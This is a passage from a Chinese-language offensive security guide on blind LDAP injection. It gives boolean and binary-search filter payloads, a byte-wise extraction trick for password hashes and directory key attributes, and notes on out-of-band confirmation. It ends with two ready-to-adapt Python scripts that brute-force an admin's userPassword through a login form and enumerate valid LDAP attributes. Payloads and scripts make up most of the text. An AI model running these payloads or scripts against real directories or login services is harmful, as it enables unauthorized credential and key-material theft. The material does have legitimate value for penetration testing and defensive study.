## 五、LDAP盲注与高效数据提取

### 5.1 布尔盲注基础与正负响应识别
```
# 正负响应候选：登录成功/失败文案、HTTP状态码、搜索结果数、错误详情、响应时间
# 确认注入与识别正负：
USER=admin)(&(userPassword=*      → 正（密码非空）
USER=admin)(&(userPassword=ZZZZ*  → 负（前缀不符）
# 逐字符：
(&(uid=admin)(userPassword=a*)) : OK
(&(uid=admin)(userPassword=b*)) : KO
...
(&(uid=admin)(userPassword=ad*)) : OK  → 继续
```

### 5.2 二分法优化（O(log N)）
```
# 前提：可使用 (userPassword>=mid) 排序比较（caseExact/octetString排序）
# 对caseIgnore类属性也可用 >= 的词典序比较
(&(uid=admin)(userPassword>=m))  → 字符是否大于等于'm'
# 每字符8次查询（二分ASCII/Unicode区间）代替64-128次线性扫描
# 结合子串前缀可先二分定位长度区间（*(len探测用 (userPassword=*) 与空串比较）
```

### 5.3 位运算提取（v3.0新增——octetStringOrderingMatch）

`userPassword`是OCTET STRING，可对**字节**做`>=`排序比较（OID 2.5.13.18 逐位大端比较）：
```
# 过滤器中可用 属性:2.5.13.18:=<字节序列> 指定按字节序比较
(userPassword:2.5.13.18:=\64\00\01\02)
(userPassword:2.5.13.18:=\64\00)        # 前缀匹配
(userPassword:2.5.13.18:=\64\00\01)     # 每多一个字节精确一位
# 盲注：构造前缀字节序列，逐字节扩展：
# 第一字节二分0x00-0xFF（8次查询）→ 第二字节…（每字节8次，比字符集线性快一个量级）
# 命中即知哈希/明文的前缀字节，用于复现哈希或密钥材料
```
**适用性：** OpenLDAP等支持显式匹配规则的服务器；AD对userPassword比较有限，但**任何可排序的二进制属性**（objectSid、msKds-RootKeyData、GUID）都适用此思路。

### 5.4 OAST/OOB外带（无回显场景）
```
# 原理：目录侧通常无出网能力，OAST主要用于确认"服务器是否真的执行了注入的过滤器"
# 场景：过滤器内引用可触发服务器出网的属性值（如mail记录为攻击者域名、URL属性）
# 通用OAST通道：DNS/HTTP（Burp Collaborator、interact.sh、dnslog.cn、自建OAST）
# 触发形态（取决于目录与应用行为，多数需应用层配合）：
#   应用把搜索结果写入日志/发送邮件/回调 → 间接外带
#   更常见：盲注本身即可完成提取，OAST仅作存在性证明（如POC验证）
```
**实战定位：** 当应用无任何正负差异且无错误输出时，优先确认是否存在**可观察的搜索行为**（日志、LDAP审计、监控告警）——OAST验证优先级低于布尔/时间盲注的普适性，不要过度依赖。

### 5.5 自动化脚本（可直接复制改造）
```python
import requests, string

URL = "http://TARGET/login"
POSITIVE = "Login successful"          # 正响应特征串
TARGET_USER = "admin"                   # 目标用户
EXFIL_ATTR = "userPassword"             # 提取属性
ALPHABET = string.printable             # 按需缩小为 string.ascii_letters+digits+"@._-"

flag = ""
while True:
    found = False
    for c in ALPHABET:
        # OR短路注入：登录成功 ⟺ 属性以 flag+c 开头
        username = f"{TARGET_USER})(|({EXFIL_ATTR}={flag}{c}*"
        password = "invalid)"
        r = requests.post(URL, data={"username": username, "password": password},
                          timeout=10)
        if POSITIVE in r.text:
            flag += c
            print(f"[+] {EXFIL_ATTR}: {flag}", flush=True)
            found = True
            break
    if not found:
        print(f"[*] 提取完成: {flag}")
        break
```

```python
# 有效LDAP字段发现（*)(ATTR=*))%00 批量探测）
import requests
fields, url = [], "http://TARGET/login"
for attr in ["userPassword","surname","name","cn","sn","objectClass","mail",
             "givenName","commonName","description","extensionAttribute1","info"]:
    r = requests.post(url, data={"username": f"*)({attr}=*))%00", "password": "x"})
    if "Login success" in r.text:
        fields.append(attr)
print("有效字段:", fields)
```

